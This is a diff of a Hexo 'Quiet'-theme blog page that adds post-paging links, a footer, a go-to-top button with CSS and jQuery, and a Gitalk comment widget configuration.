-    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
-        color: #383636;
-    }
-    
-    
-    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
-        color: #5e5e5f;
-    }
-    
-    
-    .nav-right nav a.hover, #local-search-result a.hover{
-        background-color: #e2e0e0;
-    }
-    
-    
 
-    /*列表样式*/
-    
-
-    /* 背景图样式 */
-    
-    
-
-
-    /*引用块样式*/
-    
-
-    /*文章列表背景图*/
-    
-
-    
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            max-width: 88%
+        }
+    }
 </style>
 
+    <div class="post-paging">
+    
+    <a href="/2023/11/05/%E9%B9%8F%E7%A8%8B%E6%9D%AFmisc/">
+        <div class="post-paging-last">
+            <span>上一篇</span>
+            <p></p>
+        </div>
+    </a>
+    
+
+    
+    <a href="/2023/09/27/misc/">
+        <div class="post-paging-next">
+            <span>下一篇</span>
+            <p></p>
+        </div>
+    </a>
+    
+</div>
+</div>
+		
+<div class="footer">
+	<div class="Copyright">
+		©2024 By Joey. 主题：<a
+			style="text-decoration: none;display: contents; color: #898F9F;"
+			target="_blank" rel="noopener" href="https://github.com/79e/hexo-theme-quiet">Quiet</a>
+	</div>
+	<div class="contact">
+		
+		<a target="_blank" rel="noopener" href="https://github.com/79E/hexo-theme-quiet">
+			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+		</a>
+		
+	</div>
+</div>
+
+<script src="/js/gotop.js"></script>
 
 
+<style type="text/css">
+    @media screen and (min-width: 600px) {
+        .goTop>span {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+            opacity: 0.8;
+            background: rgba(18, 24, 58, 0.06);
+            text-align: center;
+            transition: border .5s;
+            border: 1px solid rgba(18, 24, 58, 0.06);
+
+            -moz-transition: border .5s;
+            /* Firefox 4 */
+            -webkit-transition: border .5s;
+            /* Safari 和 Chrome */
+            -o-transition: border .5s;
+            /* Opera */
+        }
+
+        .goTop>span:hover {
+            border: 1px solid #6680B3;
+        }
 
 
+        .goTop {
+            position: fixed;
+            right: 30px;
+            bottom: 80px;
+        }
+
+        .goTop>span>svg {
+            width: 20px;
+            height: 20px;
+            opacity: 0.7;
+        }
+
+    }
+
+    @media screen and (max-width: 600px) {
+        .goTop {
+            display: none;
+        }
+    }
+</style>
+<div class="goTop" id="js-go_top">
+    <span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+            <g>
+                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
+            </g>
+        </svg>
+    </span>
+</div>
+<script>
+    $( '#js-go_top' )
+	.gotoTop( {
+		offset: 500,
+		speed: 300,
+		animationShow: {
+			'transform': 'translate(0,0)',
+			'transition': 'transform .5s ease-in-out'
+		},
+		animationHide: {
+			'transform': 'translate(100px,0)',
+			'transition': 'transform .5s ease-in-out'
+		}
+	} );
+</script>
 
 
+    <!-- Gitalk -->
+    <script>
+        const data = '{"clientID":"02b3c","clientSecret":"adfc7b4","repo":"gimment","owner":"duneng","admin":"duneng"}'
+        const gitalk = new Gitalk({
+            ...JSON.parse( data),
+            id:location.pathname,
+            distractionFreeMode:false
+        })
+        
+        if(Boolean('true')){
+            gitalk.render('gitalk-container')
+        }
+    </script>
+
+<script>
+	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/79e/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
+</script>
+	</body>
 </html>
+
